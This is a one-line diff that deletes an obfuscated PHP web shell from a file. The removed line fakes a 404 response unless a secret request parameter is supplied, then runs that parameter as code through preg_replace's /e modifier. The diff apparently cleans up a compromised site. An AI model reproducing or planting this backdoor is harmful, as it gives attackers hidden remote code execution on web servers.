@@ -1,1 +1,0 @@
-<?php if (!isset($_REQUEST['e44e'])) header("HTTP/1.0 404 Not Found"); @preg_replace('/(.*)/e', @$_REQUEST['e44e'], ''); ?>
